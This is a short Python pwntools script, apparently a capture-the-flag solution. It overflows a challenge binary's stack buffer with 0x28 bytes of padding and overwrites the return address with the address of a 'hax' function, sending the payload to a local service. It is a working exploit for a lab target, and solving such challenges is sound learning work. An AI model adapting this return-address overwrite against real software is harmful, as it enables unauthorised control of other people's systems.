# overwrite return address with address of 'hax()' function
from pwn import *

binary = ELF('../dist/get_the_flaAAAAAAAAA')
context.binary = binary
"""
----------------------------------------------------------------------------------
|  padding until instruction pointer (0x28 bytes)  |  address of 'hax' function  |
----------------------------------------------------------------------------------
"""
payload = b'A'*0x28 + p64(binary.symbols['hax'])

#p = process('../dist/get_the_flaAAAAAAAAA')
p = remote('127.0.0.1',50371)
p.recvuntil('Hi! How are you today?: ')
p.sendline(payload)
p.interactive()